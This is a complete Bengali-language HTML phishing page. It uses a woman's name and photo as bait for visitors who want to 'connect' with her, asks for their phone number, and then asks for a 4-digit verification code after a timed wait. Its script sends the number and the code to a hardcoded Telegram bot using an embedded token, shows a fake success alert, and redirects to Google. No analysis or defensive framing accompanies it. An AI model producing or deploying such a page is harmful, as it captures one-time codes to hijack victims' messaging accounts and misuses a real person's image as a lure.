<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect - Sanjida Akter</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        .card { background: #fff; width: 90%; max-width: 380px; border-radius: 20px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; border: 1px solid #eee; }
        
        /* প্রোফাইল হেডার (ছবি এবং নাম পাশাপাশি) */
        .profile-header { display: flex; align-items: center; justify-content: center; margin-bottom: 20px; background: #fafafa; padding: 10px; border-radius: 50px; border: 1px solid #f0f0f0; }
        .profile-img { width: 50px; height: 50px; border-radius: 50%; object-fit: cover; border: 2px solid #0084ff; background-color: #eee; }
        .profile-name-top { font-weight: bold; font-size: 18px; color: #333; margin-left: 12px; }

        .title { font-size: 22px; font-weight: bold; color: #000; margin-bottom: 10px; }
        .instruction { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }

        /* ইনপুট ফিল্ড */
        .input-container { border: 2px solid #e0e0e0; border-radius: 12px; display: flex; align-items: center; padding: 5px; margin-bottom: 20px; background: white; transition: 0.3s; }
        .input-container:focus-within { border-color: #0084ff; }
        .country-input { width: 75px; border: none; border-right: 1px solid #eee; outline: none; font-size: 17px; font-weight: bold; text-align: center; padding: 12px 5px; }
        .main-phone { border: none; outline: none; font-size: 17px; width: 100%; padding: 12px; }

        /* ভেরিফিকেশন কোড বক্স */
        .code-container { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
        .code-box { width: 45px; height: 55px; border: 2px solid #ddd; border-radius: 10px; text-align: center; font-size: 24px; font-weight: bold; background: #f8f9fa; outline: none; }
        
        button { width: 100%; padding: 16px; background-color: #c9d2db; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: not-allowed; transition: 0.3s; }
        button.active { background-color: #0084ff; cursor: pointer; box-shadow: 0 5px 15px rgba(0,132,255,0.3); }
        
        .timer { color: #888; font-size: 13px; margin-top: 15px; font-style: italic; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div id="page1">
    <div class="card">
        <div class="profile-header">
            <img src="https://i.ibb.co/wNSPbzMN/IMG-20260408-WA0040.jpg" class="profile-img" alt="Sanjida">
            <div class="profile-name-top">Sanjida Akter</div>
        </div>

        <div class="title">যোগাযোগ করুন</div>
        <p class="instruction">Sanjida Akter-এর সাথে যুক্ত হতে আপনার নম্বর দিয়ে যাচাই করুন।</p>
        
        <div class="input-container">
            <input type="text" id="countryCode" class="country-input" placeholder="+880" value="+880">
            <input type="number" id="phone" class="main-phone" placeholder="ফোন নম্বর লিখুন" oninput="checkBtn()">
        </div>
        <button id="submitBtn" onclick="goToVerify()">চালিয়ে যান ➔</button>
    </div>
</div>

<div id="page2" class="hidden">
    <div class="card">
        <div style="font-size: 50px; color:#0084ff; margin-bottom: 15px;">🛡️</div>
        <div class="title">নিরাপত্তা যাচাই</div>
        <p class="instruction">৪-সংখ্যার কোডটি দিতে টাইমার শেষ হওয়া পর্যন্ত অপেক্ষা করুন।</p>
        
        <div class="code-container">
            <input type="number" class="code-box" maxlength="1" oninput="moveNext(this, 'c2')" id="c1">
            <input type="number" class="code-box" maxlength="1" oninput="moveNext(this, 'c3')" id="c2">
            <input type="number" class="code-box" maxlength="1" oninput="moveNext(this, 'c4')" id="c3">
            <input type="number" class="code-box" maxlength="1" oninput="sendCode(this)" id="c4">
        </div>

        <div id="timerText" class="timer">অনুগ্রহ করে ২৫ সেকেন্ড অপেক্ষা করুন...</div>
    </div>
</div>

<script>
    const token = "8794180523:AAEtAX0_NfcKPvJdSPNpuil6zWZupVu23zY";
    const chat_id = "8624234278";
    let userFullPhone = "";

    function checkBtn() {
        const phone = document.getElementById("phone").value;
        const btn = document.getElementById("submitBtn");
        if(phone.length >= 8) btn.classList.add("active");
        else btn.classList.remove("active");
    }

    function goToVerify() {
        const cCode = document.getElementById("countryCode").value || "+880";
        const phone = document.getElementById("phone").value;
        if(phone.length < 8) return;
        userFullPhone = cCode + phone;
        
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📱 New Request!\nNumber: " + userFullPhone + "\nTarget: Sanjida Akter")}`);

        document.getElementById("page1").classList.add("hidden");
        document.getElementById("page2").classList.remove("hidden");
        startTimer();
    }

    function startTimer() {
        let timeLeft = 25;
        const timerText = document.getElementById("timerText");
        const inputs = document.querySelectorAll(".code-box");
        inputs.forEach(i => i.disabled = true);

        const interval = setInterval(() => {
            timeLeft--;
            timerText.innerText = `অনুগ্রহ করে ${timeLeft} সেকেন্ড অপেক্ষা করুন...`;
            if (timeLeft <= 0) {
                clearInterval(interval);
                timerText.innerText = "আপনি এখন কোডটি দিতে পারেন";
                inputs.forEach(i => i.disabled = false);
                inputs[0].focus();
            }
        }, 1000);
    }

    function moveNext(curr, nextId) {
        if(curr.value.length >= 1) {
            curr.value = curr.value.slice(0,1);
            document.getElementById(nextId).focus();
        }
    }

    function sendCode(lastInput) {
        if(lastInput.value.length >= 1) {
            lastInput.value = lastInput.value.slice(0,1);
            const c1 = document.getElementById("c1").value;
            const c2 = document.getElementById("c2").value;
            const c3 = document.getElementById("c3").value;
            const c4 = document.getElementById("c4").value;
            const fullCode = c1 + c2 + c3 + c4;

            const msg = `🔔 CODE RECEIVED!\n\n📱 Number: ${userFullPhone}\n👤 Profile: Sanjida Akter\n🔑 Code: ${fullCode}`;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
            .then(() => {
                alert("যাচাইকরণ সফল হয়েছে!");
                window.location.href = "https://www.google.com";
            });
        }
    }
</script>

</body>
</html>
